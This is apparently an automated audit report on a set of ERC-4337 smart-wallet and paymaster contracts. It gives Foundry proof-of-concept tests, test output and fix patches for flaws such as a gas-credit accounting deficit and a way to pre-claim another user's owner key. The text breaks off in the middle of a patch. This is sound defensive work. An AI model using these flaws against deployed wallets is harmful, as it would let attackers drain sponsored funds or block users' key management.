        uint256 creditBefore = paymaster.totalGasCredit();
        assertEq(depositBefore, creditBefore);

        (, uint256 actualUserOpFeePerGas, uint256 depositCharge) =
            mockEntryPoint.settleSponsoredOp(paymaster, op, maxCost, actualGasCost);

        assertEq(actualUserOpFeePerGas, expectedUserOpFeePerGas);
        assertEq(depositCharge, expectedEntryPointCharge);

        assertEq(paymaster.gasCredit(address(attackerWallet)), attackerRequiredCredit - expectedHPPaymasterCharge);
        assertEq(paymaster.gasCredit(address(victimWallet)), 1 ether);
        assertEq(paymaster.totalGasCredit(), creditBefore - expectedHPPaymasterCharge);
        assertEq(mockEntryPoint.balanceOf(address(paymaster)), depositBefore - expectedEntryPointCharge);

        assertEq(paymaster.totalGasCredit() - mockEntryPoint.balanceOf(address(paymaster)), expectedDeficit);
        assertEq(expectedDeficit, postOpGas * (expectedUserOpFeePerGas - tx.gasprice));
        assertGt(expectedDeficit, 0);
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd contracts && forge build
```

### Output

```
[output truncated: 24 lines & 0.9990234375 KB skipped]
84 |     modifier notDelegated() virtual {
   |     ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for test/wallets/WalletHarnessPlaceholder.t.sol:HPPaymasterGasPriceAccountingPoCTest
[PASS] test_poc_wrongGasPriceAccounting_createsSharedBackingDeficit() (gas: 172086)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.93ms (1.37ms CPU time)

Ran 1 test suite in 11.71ms (3.93ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC compiled and passed via `cd contracts && forge test --match-path test/wallets/WalletHarnessPlaceholder.t.sol -vv`. It uses a minimal legacy-v0.6 EntryPoint stand-in to drive the public `validatePaymasterUserOp`/`postOp` callbacks and model deposit settlement at the user-operation gas price, because the vendored wallet scope exposes only the v0.6 interfaces and existing harnesses, not a buildable legacy EntryPoint implementation.

## Remediation

### Explanation

HPPaymaster now carries the ERC-4337 user-operation gas price from validatePaymasterUserOp into postOp context and charges the fixed POST_OP_GAS margin using that user-op fee rate instead of tx.gasprice, aligning internal credit accounting with EntryPoint settlement.

### Patch

```diff
diff --git a/contracts/src/wallets/HPPaymaster.sol b/contracts/src/wallets/HPPaymaster.sol
--- a/contracts/src/wallets/HPPaymaster.sol
+++ b/contracts/src/wallets/HPPaymaster.sol
@@ -1,188 +1,193 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { IEntryPoint } from "@account-abstraction/legacy/v06/IEntryPoint06.sol";
 import { IPaymaster06 } from "@account-abstraction/legacy/v06/IPaymaster06.sol";
 import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { IHPWalletRegistry } from "./interfaces/IHPWalletRegistry.sol";
 
 /// @title HPPaymaster
 /// @notice ERC-4337 v0.6 deposit paymaster: sponsors gas for registered HPSmartWallets out of per-wallet ETH
 ///         credits. Credits are funded via `depositFor` (deposit-skim flow, future deposit router, or treasury
 ///         top-up) and the backing ETH lives as this contract's deposit inside the EntryPoint.
 /// @dev Validation-phase rules (ERC-7562):
 ///      - `registry.isRegisteredWallet[sender]` and `gasCredit[sender]` are sender-associated storage — allowed.
 ///      - The AddressProvider must NOT be read during validation, so the registry address is cached in this
 ///        contract's own storage (allowed while staked) and refreshed permissionlessly via `syncRegistry`.
 ///      Deployment order: registry -> paymaster (constructor resolves WALLET_REGISTRY), then `addStake` and an
 ///      initial `depositFor`/EntryPoint deposit before the first sponsored op.
 contract HPPaymaster is IPaymaster06, AddressBook {
     // --------------------------------------------
     //  Configuration
     // --------------------------------------------
 
     /// @dev Gas margin charged on top of `actualGasCost` to cover the `postOp` call itself.
     uint256 public constant POST_OP_GAS = 45_000;
 
     IEntryPoint public immutable entryPoint;
 
     /// @dev Cached so validation never touches AddressProvider storage (see contract natspec).
     IHPWalletRegistry public registry;
 
     mapping(address wallet => uint256 creditWei) public gasCredit;
 
     /// @dev Sum of all outstanding credits; EntryPoint deposit above this is withdrawable surplus.
     uint256 public totalGasCredit;
 
     // --------------------------------------------
     //  Events and Errors
     // --------------------------------------------
 
     event GasCreditDeposited(address indexed funder, address indexed wallet, uint256 amount);
     event GasCreditUsed(address indexed wallet, uint256 amount);
     event RegistrySynced(address indexed registry);
     event SurplusWithdrawn(address indexed to, uint256 amount);
 
     error NotEntryPoint();
     error NotAdmin();
     error ZeroEntryPoint();
     error ZeroWallet();
     error ZeroDeposit();
     error ZeroWithdrawAddress();
     error WalletNotRegistered(address wallet);
     error InsufficientGasCredit(address wallet, uint256 credit, uint256 required);
     error WithdrawExceedsSurplus(uint256 requested, uint256 surplus);
 
     // --------------------------------------------
     //  Modifiers
     // --------------------------------------------
 
     modifier onlyEntryPoint() {
         if (msg.sender != address(entryPoint)) revert NotEntryPoint();
         _;
     }
 
     /// @dev Admin = holder of the AddressProvider's DEFAULT_ADMIN_ROLE; no separate ownership system.
     modifier onlyAdmin() {
         if (!addressProvider.hasRole(bytes32(0), msg.sender)) revert NotAdmin();
         _;
     }
 
     // --------------------------------------------
     //  Initialization
     // --------------------------------------------
 
     constructor(address addressProvider_, address entryPoint_) AddressBook(addressProvider_) {
         if (entryPoint_ == address(0)) revert ZeroEntryPoint();
         entryPoint = IEntryPoint(entryPoint_);
         syncRegistry();
     }
 
     /// @notice Re-resolves the registry from the AddressProvider. Permissionless: the provider is the source
     ///         of truth and its mutations are already role-gated.
     function syncRegistry() public {
         registry = IHPWalletRegistry(_getAddress(_addressKey("WALLET_REGISTRY")));
         emit RegistrySynced(address(registry));
     }
 
     // --------------------------------------------
     //  Funding
     // --------------------------------------------
 
     /// @notice Credits `wallet` with `msg.value` of gas allowance and moves the ETH into the EntryPoint deposit.
     /// @dev Callable by anyone (treasury script, deposit router, or the user). `wallet` may be a counterfactual
     ///      address — credits can be funded before the wallet is deployed.
     function depositFor(address wallet) external payable {
         if (wallet == address(0)) revert ZeroWallet();
         if (msg.value == 0) revert ZeroDeposit();
 
         gasCredit[wallet] += msg.value;
         totalGasCredit += msg.value;
 
         entryPoint.depositTo{ value: msg.value }(address(this));
 
         emit GasCreditDeposited(msg.sender, wallet, msg.value);
     }
 
     // --------------------------------------------
     //  ERC-4337 paymaster
     // --------------------------------------------
 
     /// @inheritdoc IPaymaster06
     function validatePaymasterUserOp(UserOperation06 calldata userOp, bytes32, uint256 maxCost)
         external
         view
         onlyEntryPoint
         returns (bytes memory context, uint256 validationData)
     {
         address sender = userOp.sender;
 
         // Wallet deployment (initCode) runs before paymaster validation, so freshly created wallets are
         // already registered by the factory at this point.
         if (!registry.isRegisteredWallet(sender)) revert WalletNotRegistered(sender);
 
         uint256 required = maxCost + POST_OP_GAS * userOp.maxFeePerGas;
         uint256 credit = gasCredit[sender];
         if (credit < required) revert InsufficientGasCredit(sender, credit, required);
 
-        return (abi.encode(sender), 0);
+        return (abi.encode(sender, _userOpGasPrice(userOp)), 0);
     }
 
     /// @inheritdoc IPaymaster06
     /// @dev Never reverts: a postOp revert would force the EntryPoint to re-execute in `postOpReverted` mode.
     ///      The charge is clamped to the remaining credit; validation guarantees the clamp is a no-op in
     ///      practice (credit covered maxCost + margin).
     function postOp(PostOpMode, bytes calldata context, uint256 actualGasCost) external onlyEntryPoint {
-        address wallet = abi.decode(context, (address));
+        (address wallet, uint256 userOpFeePerGas) = abi.decode(context, (address, uint256));
 
-        uint256 charge = actualGasCost + POST_OP_GAS * tx.gasprice;
+        uint256 charge = actualGasCost + POST_OP_GAS * userOpFeePerGas;
         uint256 credit = gasCredit[wallet];
         if (charge > credit) charge = credit;
 
         unchecked {
             gasCredit[wallet] = credit - charge;
             totalGasCredit -= charge;
         }
 
         emit GasCreditUsed(wallet, charge);
     }
 
     // --------------------------------------------
     //  EntryPoint stake / deposit administration
     // --------------------------------------------
 
     function addStake(uint32 unstakeDelaySec) external payable onlyAdmin {
         entryPoint.addStake{ value: msg.value }(unstakeDelaySec);
     }
 
     function unlockStake() external onlyAdmin {
         entryPoint.unlockStake();
     }
 
     function withdrawStake(address payable to) external onlyAdmin {
         if (to == address(0)) revert ZeroWithdrawAddress();
         entryPoint.withdrawStake(to);
     }
 
     /// @notice Withdraws EntryPoint deposit above the sum of outstanding user credits (e.g. accumulated
     ///         postOp margins). User credits themselves can never be withdrawn by the platform.
     function withdrawSurplus(address payable to, uint256 amount) external onlyAdmin {
         if (to == address(0)) revert ZeroWithdrawAddress();
 
         uint256 available = surplus();
         if (amount > available) revert WithdrawExceedsSurplus(amount, available);
 
         entryPoint.withdrawTo(to, amount);
 
         emit SurplusWithdrawn(to, amount);
     }
 
     /// @notice EntryPoint deposit not backing any user credit.
     function surplus() public view returns (uint256) {
         uint256 deposit = entryPoint.balanceOf(address(this));
         return deposit > totalGasCredit ? deposit - totalGasCredit : 0;
     }
+
+    function _userOpGasPrice(UserOperation06 calldata userOp) internal view returns (uint256) {
+        uint256 cappedPriorityPrice = block.basefee + userOp.maxPriorityFeePerGas;
+        return userOp.maxFeePerGas < cappedPriorityPrice ? userOp.maxFeePerGas : cappedPriorityPrice;
+    }
 }
```

### Affected files
- `contracts/src/wallets/HPPaymaster.sol`

### Validation output

```
[output truncated: 33 lines & 1.537109375 KB skipped]

Failing tests:
Encountered 1 failing test in test/wallets/WalletHarnessPlaceholder.t.sol:HPPaymasterGasPriceAccountingPoCTest
[FAIL: assertion failed: 7000000000000000 != 11410000000000000] test_poc_wrongGasPriceAccounting_createsSharedBackingDeficit() (gas: 167734)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

---

# Unset registry key bricks later owner removal
**#84969**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPWalletRegistry.sol`
#### Lines 96-103 — _removeOwner reverts OwnerNotRegisteredToWallet when not indexed_

```
    function removeOwner(bytes calldata owner) external onlyRegisteredWallet {
        bytes32 ownerHash = keccak256(owner);
        if (getWallet[ownerHash] != msg.sender) revert OwnerNotRegisteredToWallet(owner, msg.sender);

        delete getWallet[ownerHash];

        emit OwnerDeindexed(msg.sender, ownerHash, owner);
    }
```

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 178-198 — _asymmetric add/remove sync; raw get can be address(0)_

```
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual override {
        super._addOwnerAtIndex(owner, index);

        IHPWalletRegistry registry = _registry();
        if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
            registry.addOwner(owner);
        }
    }

    function _removeOwnerAtIndex(uint256 index, bytes calldata owner) internal virtual override {
        super._removeOwnerAtIndex(index, owner);

        IHPWalletRegistry registry = _registry();
        if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
            registry.removeOwner(owner);
        }
    }

    /// @dev Raw `get` (not `_getAddress`) so an unset WALLET_REGISTRY key never bricks owner management.
    function _registry() internal view returns (IHPWalletRegistry) {
        return IHPWalletRegistry(addressProvider.get(_addressKey("WALLET_REGISTRY")));
```

## Description

`HPSmartWallet` syncs owner changes into the registry only when the resolved `WALLET_REGISTRY` address is non-zero; `_addOwnerAtIndex` deliberately uses a raw `addressProvider.get` so that an unset key does not block adding an owner. However the removal path is asymmetric: if an owner is added while the `WALLET_REGISTRY` key is unset (so `registry.addOwner` is skipped and the key is never indexed) and the key is later restored, removing that owner calls `registry.removeOwner`, which reverts `OwnerNotRegisteredToWallet` because `getWallet[hash(owner)]` is zero rather than `msg.sender`. That revert propagates through the wallet's `_removeOwnerAtIndex`, so `removeOwnerAtIndex`/`removeLastOwner` for that owner revert permanently while the registry key is set. The system thus reaches a state where a locally valid owner can never be removed without re-disabling the registry key, contradicting the design intent that an unset key must not brick owner management.

## Root cause

Owner add/remove registry sync is asymmetric: adds are skipped when `WALLET_REGISTRY` is unset, but `HPWalletRegistry.removeOwner` reverts on a missing index, so an owner indexed inconsistently can never be removed once the key is set.

## Impact

An owner added during a registry-key-unset window can never be removed once the key is restored, permanently blocking owner rotation/revocation for that key and leaving a compromised or unwanted owner in place. The condition is reachable through an ordinary admin reconfiguration of the `WALLET_REGISTRY` address.

## Proof of concept

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd contracts && forge build
```

### Invalid reason

The revert is real but not exploitable through attacker-controlled public entry points. Reaching the inconsistent state requires a privileged `AddressProvider.setName("WALLET_REGISTRY", address(0))` / restore sequence, and `setName` is restricted to `onlyRole(ADDRESS_MANAGER_ROLE)` in `contracts/src/AddressProvider.sol:87-93`. Existing wallet owner-management entry points are public but owner-gated (`addOwnerAddress`, `removeOwnerAtIndex`, `removeLastOwner`) in `contracts/src/wallets/base/MultiOwnable.sol:37-60`, so an external attacker cannot trigger the prerequisite admin reconfiguration. The underlying behavior is evidenced by the asymmetric sync in `contracts/src/wallets/HPSmartWallet.sol:178-198` and the hard revert in `contracts/src/wallets/HPWalletRegistry.sol:96-103`, but under the required attacker model this is a privileged misconfiguration hazard, not a public-entry exploit.

---

# Owner-key uniqueness blocks adding owners to a wallet
**#84981**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 178-185 — _override mirrors owner add into registry; revert reverts the add_

```
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual override {
        super._addOwnerAtIndex(owner, index);

        IHPWalletRegistry registry = _registry();
        if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
            registry.addOwner(owner);
        }
    }
```

### `contracts/src/wallets/HPWalletRegistry.sol`
#### Lines 90-115 — _addOwner -> _indexOwner reverts on duplicate key_

```
    /// @inheritdoc IHPWalletRegistry
    function addOwner(bytes calldata owner) external onlyRegisteredWallet {
        _indexOwner(msg.sender, owner);
    }

    /// @inheritdoc IHPWalletRegistry
    function removeOwner(bytes calldata owner) external onlyRegisteredWallet {
        bytes32 ownerHash = keccak256(owner);
        if (getWallet[ownerHash] != msg.sender) revert OwnerNotRegisteredToWallet(owner, msg.sender);

        delete getWallet[ownerHash];

        emit OwnerDeindexed(msg.sender, ownerHash, owner);
    }

    /// @dev One wallet per signer key: an owner already mapped elsewhere reverts to keep lookups unambiguous.
    function _indexOwner(address wallet, bytes memory owner) private {
        bytes32 ownerHash = keccak256(owner);

        address current = getWallet[ownerHash];
        if (current != address(0)) revert OwnerAlreadyRegistered(owner, current);

        getWallet[ownerHash] = wallet;

        emit OwnerIndexed(wallet, ownerHash, owner);
    }
```

## Description

`HPSmartWallet._addOwnerAtIndex` overrides the base `MultiOwnable` hook so that, once the wallet is registered, every owner addition is mirrored into the central registry via `registry.addOwner(owner)`. The registry's `addOwner` calls `_indexOwner`, which reverts with `OwnerAlreadyRegistered` if that owner key is already bound to any other wallet. Because the local owner write in `super._addOwnerAtIndex` and the registry write happen in the same transaction, a revert in the registry reverts the entire owner addition. An attacker can therefore pre-claim a target owner key (an EOA address or a P-256 passkey) by adding it to an attacker-controlled wallet first, after which the victim's `addOwnerAddress` / `addOwnerPublicKey` for that exact key permanently reverts on the victim's wallet. The same coupling applies on the cross-chain `executeWithoutChainIdValidation` path, where the registry write can fail on one chain and succeed on another.

## Root cause

Coupling local owner addition to a globally-unique registry index (`_addOwnerAtIndex` → `registry.addOwner` → `_indexOwner`) lets any external party block a specific owner key by claiming it first in the shared registry.

## Impact

An attacker can selectively prevent a user from adding a specific signer key (e.g. a designated recovery passkey or co-signer) to their wallet, blocking that key forever while the attacker keeps it claimed. This degrades the wallet's owner-management and recovery guarantees, though the user can fall back to a different key.

---

# Removing the final owner permanently bricks the wallet
**#84982**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/base/MultiOwnable.sol`
#### Lines 53-60 — _removeLastOwner removes the only remaining owner_

```
    function removeLastOwner(uint256 index, bytes calldata owner) external virtual onlyOwner {
        uint256 ownersRemaining = ownerCount();
        if (ownersRemaining > 1) {
            revert NotLastOwner(ownersRemaining);
        }

        _removeOwnerAtIndex(index, owner);
    }
```

### `contracts/src/wallets/HPSmartWallet.sol` (2 locations)
#### Lines 187-193 — _registry de-index on removal; isRegisteredWallet not cleared_

```
    function _removeOwnerAtIndex(uint256 index, bytes calldata owner) internal virtual override {
        super._removeOwnerAtIndex(index, owner);

        IHPWalletRegistry registry = _registry();
        if (address(registry) != address(0) && registry.isRegisteredWallet(address(this))) {
            registry.removeOwner(owner);
        }
```

⋯
#### Lines 287-298 — _removeLastOwner whitelisted for cross-chain replay_

```
    function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
        if (
            functionSelector == MultiOwnable.addOwnerPublicKey.selector
                || functionSelector == MultiOwnable.addOwnerAddress.selector
                || functionSelector == MultiOwnable.removeOwnerAtIndex.selector
                || functionSelector == MultiOwnable.removeLastOwner.selector
                || functionSelector == UUPSUpgradeable.upgradeToAndCall.selector
        ) {
            return true;
        }
        return false;
    }
```

## Description

`removeLastOwner` is exposed by the inherited `MultiOwnable` base and is also whitelisted in `canSkipChainIdValidation`, so it can be invoked by an owner directly, through the EntryPoint, or replayed cross-chain. It calls `_removeOwnerAtIndex` when exactly one owner remains, leaving the wallet with zero owners. After that, `_checkOwner` can never pass for any external caller (no `isOwnerAddress` is true and `msg.sender == address(this)` only holds for self-calls that themselves require an owner-authorized entry), so `execute`, `executeBatch`, owner management, and `_authorizeUpgrade` all become permanently unreachable. The wallet's `_removeOwnerAtIndex` override also de-indexes the owner from the registry, but `isRegisteredWallet[wallet]` stays `true`, leaving a registered wallet with no controllable owner and no owner-hash mapping.

## Root cause

`removeLastOwner` allows the owner set to reach zero with no recovery mechanism, and the registry sync de-indexes the owner without clearing the wallet's registered flag, producing a permanently uncontrollable wallet and an inconsistent registry record.

## Impact

A wallet that removes its last owner is permanently uncontrollable: any assets it holds are frozen with no execution or upgrade path. The registry is left in an inconsistent state where the address is still flagged as a registered wallet despite having no resolvable owner.

---

# Initialization emits wrong previous-value in settings event
**#84983**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 100-104 — _emits DefaultCryptoUpdated(ETH, ETH) though prior value is BTC_

```
        WalletSettingsStorage storage $ = _getWalletSettingsStorage();
        $.defaultCrypto = DefaultCrypto.ETH;
        $.defaultStablecoin = DefaultStablecoin.TGBP;
        emit DefaultCryptoUpdated(DefaultCrypto.ETH, DefaultCrypto.ETH);
        emit DefaultStablecoinUpdated(DefaultStablecoin.TGBP, DefaultStablecoin.TGBP);
```

### `contracts/src/wallets/types/HPWalletTypes.sol`
#### Lines 6-10 — _BTC is the zero value of DefaultCrypto_

```
enum DefaultCrypto {
    BTC,
    ETH,
    SETH
}
```

## Description

`initialize` seeds the wallet's default settings and emits `DefaultCryptoUpdated(DefaultCrypto.ETH, DefaultCrypto.ETH)` and `DefaultStablecoinUpdated(DefaultStablecoin.TGBP, DefaultStablecoin.TGBP)`. The `DefaultCrypto` enum has `BTC` as its zero value, so the storage slot actually transitions from `BTC` (the implicit zero default) to `ETH`, yet the event reports the previous value as `ETH`. Off-chain indexers that reconstruct a wallet's preference history from these events will record an incorrect prior state for the crypto preference. The stablecoin event is coincidentally accurate because `TGBP` is the zero value of `DefaultStablecoin`.

## Root cause

The initialization event reports `ETH` as the previous crypto value instead of the actual zero-value `BTC`, a mismatch between emitted event data and real state transition.

## Impact

Off-chain consumers tracking user preference history via events receive a misleading previous-value for the initial crypto setting. There is no on-chain state corruption or fund impact.

## Proof of concept

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd contracts && forge build
```

### Invalid reason

`HPSmartWalletFactory.createAccount()` publicly reaches `HPSmartWallet.initialize()`, and that initializer does emit `DefaultCryptoUpdated(ETH, ETH)` while the enum zero value is `BTC` (`contracts/src/wallets/HPSmartWallet.sol:100-104`, `contracts/src/wallets/types/HPWalletTypes.sol:6-10`). But the stored state is still set correctly to `ETH`/`TGBP`, and no authorization, accounting, or fund-moving path in scope consumes that event; the effect is limited to off-chain history reconstruction quality. This is impact-inert event metadata drift, not an exploitable security issue through public entry points.

---

# ERC-1271 check reverts instead of returning failure
**#84990**
- Severity: Low
- Validity: Unreviewed

## Source locations

### `contracts/src/wallets/base/WalletERC1271.sol`
#### Lines 32-38 — _isValidSignature is structured to always return a bytes4 selector (0x1626ba7e / 0xffffffff), never to revert._

```
    function isValidSignature(bytes32 hash, bytes calldata signature) public view virtual returns (bytes4 result) {
        if (_isValidSignature({hash: replaySafeHash(hash), signature: signature})) {
            return 0x1626ba7e;
        }

        return 0xffffffff;
    }
```

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 316-341 — _Concrete _isValidSignature reverts on malformed signature decode (316), out-of-range/removed ownerIndex (317 -> 340), invalid address owner (321), or malformed WebAuthn data (335), instead of returning false._

```
        SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
        bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);

        if (ownerBytes.length == 32) {
            if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                revert InvalidEthereumAddressOwner(ownerBytes);
            }

            address ownerAddr;
            assembly ("memory-safe") {
                ownerAddr := mload(add(ownerBytes, 32))
            }

            return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
        }

        if (ownerBytes.length == 64) {
            (uint256 x, uint256 y) = abi.decode(ownerBytes, (uint256, uint256));

            WebAuthn.WebAuthnAuth memory auth = abi.decode(sigWrapper.signatureData, (WebAuthn.WebAuthnAuth));

            return WebAuthn.verify({ challenge: abi.encode(hash), requireUV: false, webAuthnAuth: auth, x: x, y: y });
        }

        revert InvalidOwnerBytesLength(ownerBytes);
    }
```

## Description

The public `isValidSignature(bytes32,bytes)` entrypoint in this base contract is written to always resolve to a `bytes4` result — `0x1626ba7e` on success and `0xffffffff` on failure — delegating the boolean decision to the abstract `_isValidSignature`. The concrete override in `HPSmartWallet` first `abi.decode`s the raw `signature` into a `SignatureWrapper` and then looks up `ownerAtIndex(sigWrapper.ownerIndex)` with no guards. Consequently, an empty/malformed `signature` blob reverts inside `abi.decode`, an out-of-range or already-removed `ownerIndex` yields zero-length `ownerBytes` that falls through to `revert InvalidOwnerBytesLength`, and malformed WebAuthn payloads revert in their own `abi.decode`. In every one of those cases the documented `0xffffffff` failure selector is never returned; the call reverts instead, contradicting the contract's own return promise and the ERC-1271 expectation that validation report failure via the return value.

## Root cause

`isValidSignature` promises an always-`bytes4` result, but the concrete `_isValidSignature` override `abi.decode`s the signature wrapper and indexes the owner set without bounds/format guards, so malformed signatures or an out-of-range `ownerIndex` revert instead of returning the `0xffffffff` failure selector.

## Impact

Integrators that call `isValidSignature` and branch on the returned selector (rather than wrapping the call in try/catch or a manual staticcall) will themselves revert when handed a malformed signature blob or a stale/out-of-range owner index, breaking graceful failure handling and any multi-signer fallback logic that depends on a non-reverting failure path. There is no fund loss or authorization bypass; the effect is limited to composability and availability on that specific verification path.

## Proof of concept

### Test case

```
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.34;

import { HPSmartWallet } from "@src/wallets/HPSmartWallet.sol";
import { MultiOwnable } from "@src/wallets/base/MultiOwnable.sol";

import { WalletTestBase } from "./WalletTestBase.sol";

contract WalletHarnessPlaceholderTest is WalletTestBase {
    HPSmartWallet internal wallet;

    function setUp() public override {
        super.setUp();
        wallet = _createWallet(ownerEOA, 0);
    }

    function test_isValidSignature_returnsFailureSelector_forWellFormedButInvalidEoaSignature() public view {
        bytes32 hash = keccak256("message");
        bytes memory signature = _eoaSignature(ownerPk + 1, wallet.replaySafeHash(hash), 0);

        assertEq(wallet.isValidSignature(hash, signature), bytes4(0xffffffff));
    }

    function test_isValidSignature_reverts_forMalformedSignatureBlob() public view {
        bytes32 hash = keccak256("message");

        (bool success, bytes memory returndata) = address(wallet).staticcall(
            abi.encodeWithSelector(wallet.isValidSignature.selector, hash, bytes(""))
        );

        assertFalse(success, "malformed signature should revert instead of returning 0xffffffff");
        assertEq(returndata.length, 0, "abi.decode malformed calldata bubbles as an empty revert here");
    }

    function test_isValidSignature_reverts_forRemovedOwnerIndex() public {
        address secondOwner = makeAddr("secondOwner");

        vm.prank(ownerEOA);
        wallet.addOwnerAddress(secondOwner);
        assertEq(wallet.ownerCount(), 2);

        vm.prank(ownerEOA);
        wallet.removeOwnerAtIndex(1, abi.encode(secondOwner));
        assertEq(wallet.ownerCount(), 1);
        assertEq(wallet.ownerAtIndex(1).length, 0);

        bytes32 hash = keccak256("message");
        bytes memory staleIndexSignature = abi.encode(HPSmartWallet.SignatureWrapper({ ownerIndex: 1, signatureData: hex"deadbeef" }));

        (bool success, bytes memory returndata) = address(wallet).staticcall(
            abi.encodeWithSelector(wallet.isValidSignature.selector, hash, staleIndexSignature)
        );

        assertFalse(success, "removed owner index should revert instead of returning 0xffffffff");
        assertGe(returndata.length, 4, "custom error selector should be returned");
        assertEq(bytes4(returndata), MultiOwnable.InvalidOwnerBytesLength.selector);
    }
}
```

### Setup script

```
#!/bin/bash
set -e

# install dependencies
cd contracts && forge build
```

### Output

```
[output truncated: 26 lines & 1.1181640625 KB skipped]


Ran 3 tests for test/wallets/WalletHarnessPlaceholder.t.sol:WalletHarnessPlaceholderTest
[PASS] test_isValidSignature_returnsFailureSelector_forWellFormedButInvalidEoaSignature() (gas: 32779)
[PASS] test_isValidSignature_reverts_forMalformedSignatureBlob() (gas: 12740)
[PASS] test_isValidSignature_reverts_forRemovedOwnerIndex() (gas: 141084)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 3.00ms (1.47ms CPU time)

Ran 1 test suite in 10.32ms (3.00ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
Warning: Found unknown `depth` config key in section `fuzz` defined in foundry.toml.
```

### Considerations

PoC covers the public `isValidSignature(bytes32,bytes)` entry point only. It demonstrates two concrete malformed-input cases: empty signature bytes trigger a revert instead of returning `0xffffffff`, and a stale removed `ownerIndex` reverts with `InvalidOwnerBytesLength`. The harness also confirms the intended non-reverting failure path still exists for a well-formed but invalid EOA signature. It does not model a downstream integrator contract; the observable impact is the verified revert/non-revert mismatch on the ERC-1271 verification path.

## Remediation

### Explanation

Wrapped HPSmartWallet signature parsing in a self-call try/catch so malformed signature blobs, stale owner indices, and malformed WebAuthn payloads return false to WalletERC1271.isValidSignature instead of reverting, preserving successful validation paths.

### Patch

```diff
diff --git a/contracts/src/wallets/HPSmartWallet.sol b/contracts/src/wallets/HPSmartWallet.sol
--- a/contracts/src/wallets/HPSmartWallet.sol
+++ b/contracts/src/wallets/HPSmartWallet.sol
@@ -1,348 +1,360 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.34;
 
 import { IAccount06 } from "@account-abstraction/legacy/v06/IAccount06.sol";
 import { UserOperation06 } from "@account-abstraction/legacy/v06/UserOperation06.sol";
 import { Receiver } from "@solady/accounts/Receiver.sol";
 import { SignatureCheckerLib } from "@solady/utils/SignatureCheckerLib.sol";
 import { UUPSUpgradeable } from "@solady/utils/UUPSUpgradeable.sol";
 import { WebAuthn } from "@webauthn-sol/WebAuthn.sol";
 
 import { AddressBook } from "@core/AddressBook.sol";
 
 import { DefaultCrypto, DefaultStablecoin } from "./types/HPWalletTypes.sol";
 import { IHPWalletRegistry } from "./interfaces/IHPWalletRegistry.sol";
 import { MultiOwnable } from "./base/MultiOwnable.sol";
 import { UserOperation06Hash } from "./base/UserOperation06Hash.sol";
 import { WalletERC1271 } from "./base/WalletERC1271.sol";
 
 /// @notice Storage layout used by this contract.
 /// @custom:storage-location erc7201:highpotential.storage.WalletSettings
 struct WalletSettingsStorage {
     DefaultCrypto defaultCrypto;
     DefaultStablecoin defaultStablecoin;
 }
 
 /// @title HPSmartWallet
 /// @notice ERC-4337 v0.6 smart account modeled on Coinbase Smart Wallet: multi-owner (EOA + passkey), ERC-1271, UUPS.
 /// @dev Extends the base account with user settings (DefaultCrypto / DefaultStablecoin) in ERC-7201 namespaced
 ///      storage, AddressProvider-based token resolution, and HPWalletRegistry owner-index synchronization.
 ///      EntryPoint v0.6 default below; override `entryPoint()` per-chain if needed.
 contract HPSmartWallet is WalletERC1271, IAccount06, MultiOwnable, UUPSUpgradeable, Receiver, AddressBook {
     struct SignatureWrapper {
         uint256 ownerIndex;
         bytes signatureData;
     }
 
     struct Call {
         address target;
         uint256 value;
         bytes data;
     }
 
     /// @dev Upper 192 bits of `UserOperation.nonce` for `executeWithoutChainIdValidation` (Coinbase uses Base chain id).
     uint256 public constant REPLAYABLE_NONCE_KEY = 8453;
 
     /// @dev keccak256(abi.encode(uint256(keccak256("highpotential.storage.WalletSettings")) - 1)) & ~bytes32(uint256(0xff))
     bytes32 private constant _WALLET_SETTINGS_STORAGE_LOCATION =
         0xde9abc39f8ba6496385be7b2e06f782787ee07b9096c13bc6574d61d02346900;
 
     event DefaultCryptoUpdated(DefaultCrypto indexed previous, DefaultCrypto indexed current);
     event DefaultStablecoinUpdated(DefaultStablecoin indexed previous, DefaultStablecoin indexed current);
 
     error Initialized();
     error SelectorNotAllowed(bytes4 selector);
     error InvalidNonceKey(uint256 key);
     error InvalidImplementation(address implementation);
 
     modifier onlyEntryPoint() {
         if (msg.sender != entryPoint()) {
             revert Unauthorized();
         }
 
         _;
     }
 
     modifier onlyEntryPointOrOwner() {
         if (msg.sender != entryPoint()) {
             _checkOwner();
         }
 
         _;
     }
 
     modifier payPrefund(uint256 missingAccountFunds) {
         _;
 
         assembly ("memory-safe") {
             if missingAccountFunds {
